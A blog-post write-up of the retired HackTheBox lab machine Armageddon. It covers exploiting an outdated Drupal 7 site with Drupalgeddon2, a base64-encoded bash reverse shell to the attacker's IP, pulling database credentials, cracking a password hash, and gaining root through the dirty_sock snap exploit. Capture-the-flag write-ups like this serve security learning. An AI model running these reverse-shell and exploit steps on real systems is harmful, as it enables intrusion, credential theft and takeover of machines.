---
layout: post
title: "HackTheBox - Armageddon"
subtitle: "AKA Drupalgeddon"
date: 2021-06-05 23:45:13 -0400
background: '/img/blue_wave.jpg'
---

# Introduction

This is a write-up for a retired "easy" HackTheBox machine - Armageddon.

# Enumeration

Standard nmap scan reveals two open ports : 

```bash
sudo nmap -sV -sC -oA armageddon 10.10.10.233

```

![Drupal 7 revealed](/img/posts/htb-armageddon/nmap-scan-drupal.png)

Note the highlighted text - Drupal 7. This is an outdated version, though it does still receive security updates from time to time. Lets try to enumerate the exact version further.

Let's check /CHANGELOG.txt. This is file is shown in nmap scan as it's located in /robots.txt entry. 

![Drupal 7 exact verison](/img/posts/htb-armageddon/drupal7-exact-version.png)

# Exploitation


It seems this CMS hasn't been updated in some time. After checking and trying default credentials I went for the simple thing and just used Google Search.

![Drupal 7 exploit](/img/posts/htb-armageddon/drupa7-google-search.png)

Lots of hits and the name of the exploit suggest this might be it. HackTheBox often names their boxes similar to the exploit used. In this case "Armageddon" - "Drupalgeddon".

Now I understand there is a perfectly fine Metasploit module **exploit/unix/webapp/drupal_drupalgeddon2** that can exploit the server, however, I find it too dull. So I managed to find another exploit. The only thing to do is to clone it with git :

```bash
git clone https://github.com/dreadlocked/Drupalgeddon2
```

And run it :

![Gem missing for the Drupalgeddon exploit](/img/posts/htb-armageddon/exploit-gem-missing.png)

Snap! There is a ruby gem missing - **highline** . Let's install it.

![Installing missing ruby gem](/img/posts/htb-armageddon/exploit-installing-gem.png)

Since I'm running ParrotOS I needed to run the *gem* command as root. Now that this is done let's run the exploit.

![Working exploit](/img/posts/htb-armageddon/exploit-works.png)

It works! We are user *apache* in this pseudo-shell. Let's try to get the proper one. 

My first thought was to check for netcat on the system and if netcat is not present to run a simple **sh** reverse shell.

![No Netcat and bad character](/img/posts/htb-armageddon/exploit-no-nc-bad-char.png)

However, there is no netcat present (at least in my path) and the ">" character is a bad character for our flimsy shell. So when this happens my go-to tool is the base64. Let's encode our command and send it so it can be decoded on the other side and properly executed.

```bash
echo -n "sh -i >& /dev/tcp/10.10.14.70/80 0>&1" | base64
c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNzAvODAgMD4mMQ==
```

Set up a netcat listener:

```bash
sudo nc -nlvp 80
```

Now on the target :

```bash
echo -n "c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNzAvODAgMD4mMQ==" | base64 -d | bash
```

This gives a shell back :

![Shell returned as apache](/img/posts/htb-armageddon/apache-shell.png)


# Elevation To User

Since getting a proper tty on this box was not successful, I checked the Drupal default configuration location and found that its in /sites/default :


![Drupal default configuration](/img/posts/htb-armageddon/drupal-filesystem.png)

After going inside of that directory I saw *settings.php* :

```bash
sh-4.2$ pwd
pwd
/var/www/html/sites/default
sh-4.2$ ls
ls
default.settings.php
files
settings.php
sh-4.2$ 
```

After checking out settings.php I noticed the mysql credentials -
**drupaluser:CQHEy@9M*m23gBVj** :

![Mysql credentials](/img/posts/htb-armageddon/drupal-mysql.png)

Entering MySQL database without a proper shell is not going to be possible for us, so I just queried the database line by line :

```bash
mysql -u drupaluser -pCQHEy@9M*m23gBVj -D drupal -e 'show tables;'
```

Note that typing **-p CQHEy@9M*m23gBVj** did not work for me, so I had to connect the parameter and the password value.
After checking out the tables I saw the *users* table. So I queried it :

![Mysql user table](/img/posts/htb-armageddon/mysql-users-tables.png)

Yes, it's a mess. I could specify to query for columns *name* and *pass* to make it more pretty with :

```bash
mysql -u drupaluser -pCQHEy@9M*m23gBVj -D drupal -e 'select name,pass from users;'
```

So we have the username brucetherealadmin (which was an entry in /etc/passwd), and an MD5 hash :

```
$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt
```

Time to crack it with John :

![Cracking the hash with John](/img/posts/htb-armageddon/crackingthehash.png)

So the credentials are :

```
brucetherealadmin:booboo
```

Now to ssh :

![SSH into user *brucetherealadmin*](/img/posts/htb-armageddon/brucessh.png)

And we can see that the user flag has 33 characters :

![User flag](/img/posts/htb-armageddon/userflag.png)


# Privilege Escalation


Since nothing else was in our home folder I just decided to go the the easy wins and just did *sudo -l* so I can check if we can run anything with root privileges:

![Can run snap as root](/img/posts/htb-armageddon/sudo-l.png)

So we can install any snap package as root. I ran a simple google search :

![Running a google search](/img/posts/htb-armageddon/snap-google-search.png)

This article was the first hit and it explains that a popular exploit dirty_sock version 2 creates a snap package that adds a new user.

![Checking the article](/img/posts/htb-armageddon/snap-dirty-sock.png)

While the [dirty-sockv2.py](https://github.com/initstring/dirty_sock/blob/master/dirty_sockv2.py) from Github doesn't work - it does contain a python base64 encoded string which we can use to install a snap package manually. Let's try it :

```bash
python2 -c 'print "aHNxcwcAAA...." + "A"*4256 + "=="' | base64 -d
```

![Creating the snap](/img/posts/htb-armageddon/creating-the-snap.png)

After this we can switch to user *dirty_sock* :

![User dirty_sock](/img/posts/htb-armageddon/dirty-sock-user.png)

Now all we need to do is run *sudo -i* :

![Sudo -i for the root shell](/img/posts/htb-armageddon/root.png)

Rooted.



# Conclusion & Tips

This box demonstrated a typical low-hanging fruit grab - eg. that looks like the obvious thing it is the right way in.

Privilege escalation was quite interesting since it involves using an already made piece of code of a popular exploit *dirty_sock* and running the snap install command in **--devmode** - which enables an installation of a snap package without enforcing security policies. 

# Resources

[Drupal 7 Drupalgeddon exploit](https://github.com/dreadlocked/Drupalgeddon2/blob/master/drupalgeddon2.rb)

[Dirty Sock Exploit explained](https://shenaniganslabs.io/2019/02/13/Dirty-Sock.html)

[Dirty Sock Version 2 - Snapd](https://github.com/initstring/dirty_sock/blob/master/dirty_sockv2.py)